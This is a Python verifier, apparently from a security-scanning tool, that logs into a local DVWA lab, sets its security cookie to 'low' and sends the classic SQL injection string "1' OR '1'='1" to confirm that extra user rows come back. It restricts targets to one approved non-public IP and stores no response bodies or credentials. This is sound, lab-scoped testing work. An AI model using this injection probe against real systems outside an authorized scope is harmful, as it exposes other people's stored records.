"""Read-only DVWA SQL injection lab check using the existing DVWA login workflow.

Only a pre-approved numeric IP origin is accepted. No DB writes or destructive payloads.
Never persist passwords, cookies, HTML bodies or user records.
"""
from __future__ import annotations

import hashlib
import ipaddress
import re
import time
from urllib.parse import urlsplit

import requests
from bs4 import BeautifulSoup

from verification.dvwa_auth import LOGIN_CANDIDATES


def _approved_origin(origin: str, approved_ip: str) -> str:
    parts = urlsplit(origin)
    if parts.scheme != "http" or parts.username or parts.password or parts.query or parts.fragment:
        raise ValueError("DVWA lab needs explicit non-TLS local/SSM origin")
    if parts.path not in {"", "/"} or parts.port is None or not parts.hostname:
        raise ValueError("DVWA origin must be a bare IP:port")
    ip = str(ipaddress.ip_address(parts.hostname))
    if ip != approved_ip or ipaddress.ip_address(ip).is_global:
        raise ValueError("DVWA checks require approved non-public lab endpoint")
    canonical = f"http://{'[' + ip + ']' if ':' in ip else ip}:{parts.port}"
    if origin.rstrip("/") != canonical:
        raise ValueError("Use an exact numeric IP:port origin")
    return canonical


def _counts(html: str) -> int:
    text = BeautifulSoup(html, "html.parser").get_text(" ", strip=True)
    return len(re.findall(r"First\s+name\s*:", text, flags=re.IGNORECASE))


def verify_dvwa_sqli(*, origin: str, approved_ip: str, username: str, password: str, timeout=5.0):
    """Prove seeded DVWA user-row expansion, not a CVE. Caller checks ScopePolicy first."""
    base = _approved_origin(origin, approved_ip)
    if not username or not password or not 0 < timeout <= 15:
        raise ValueError("Credentials and bounded timeout required")
    started = time.monotonic()
    steps = []
    with requests.Session() as session:
        session.trust_env = False
        try:
            login_url = None
            token = None
            for path in LOGIN_CANDIDATES:
                resp = session.get(base + path, timeout=timeout, allow_redirects=False)
                if resp.status_code == 200 and "DVWA" in resp.text:
                    login_url = base + path
                    soup = BeautifulSoup(resp.text, "html.parser")
                    field = soup.find("input", {"name": "user_token"})
                    token = field.get("value", "") if field else None
                    break
            if login_url is None:
                return _result("ERROR", "DVWA_LOGIN_UNAVAILABLE", steps, started)
            payload = {"username": username, "password": password, "Login": "Login"}
            if token is not None:
                payload["user_token"] = token
            login = session.post(login_url, data=payload, timeout=timeout, allow_redirects=False)
            if login.status_code not in (200, 302, 303) or not session.cookies.get("PHPSESSID"):
                return _result("ERROR", "DVWA_LOGIN_FAILED", steps, started)
            # DVWA uses a lab-only security cookie. No server-side configuration changes.
            session.cookies.set("security", "low")
            home = session.get(base + "/index.php", timeout=timeout, allow_redirects=False)
            if home.status_code != 200 or "logout" not in home.text.lower():
                # Record only non-sensitive diagnostics; never include redirects,
                # body, credentials or session identifiers in the evidence.
                steps.append({"label": "auth_validation", "http_status": home.status_code,
                              "login_http_status": login.status_code,
                              "login_page_detected": "name=\"username\"" in home.text.lower(),
                              "logout_marker_detected": "logout" in home.text.lower(),
                              "login_redirect_path": urlsplit(login.headers.get("Location", "")).path[:80],
                              "home_redirect_path": urlsplit(home.headers.get("Location", "")).path[:80]})
                return _result("ERROR", "DVWA_AUTH_UNCONFIRMED", steps, started)
            target = base + "/vulnerabilities/sqli/"
            for label, user_id in (("baseline", "1"), ("injection", "1' OR '1'='1")):
                response = session.get(target, params={"id": user_id, "Submit": "Submit"},
                                       timeout=timeout, allow_redirects=False)
                # Only aggregate counters and raw hash; never store the response body.
                steps.append({"label": label, "http_status": response.status_code,
                              "result_rows": _counts(response.text) if response.status_code == 200 else 0,
                              "body_sha256": hashlib.sha256(response.content).hexdigest()})
                if response.status_code != 200:
                    return _result("ERROR", "DVWA_PROBE_HTTP_ERROR", steps, started)
            if steps[0]["result_rows"] != 1:
                return _result("SUCCESS", "INCONCLUSIVE", steps, started)
            finding = "CONFIRMED" if steps[1]["result_rows"] > steps[0]["result_rows"] else "NOT_DETECTED"
            return _result("SUCCESS", finding, steps, started)
        except requests.RequestException:
            return _result("ERROR", "DVWA_NETWORK_ERROR", steps, started)


def _result(execution, finding, steps, started):
    if execution == "ERROR":
        code, finding = finding, "INCONCLUSIVE"
    else:
        code = None
    return {
        "status": "ERROR" if execution == "ERROR" else "POTENTIAL",
        "checker": "DVWASQLiLabVerifier",
        "reason": "Non-destructive seeded-row comparison; CVE status is not affected",
        "error_code": code,
        "details": {"finding_status": finding, "safe_checks": ["dvwa_seeded_select_only"],
                    "request_labels": ["baseline", "injection"],
                    "steps": steps,
                    "duration_ms": round((time.monotonic() - started) * 1000)},
        "additional_checks": ["Verify DVWA security level and seeded dataset if inconclusive"],
    }
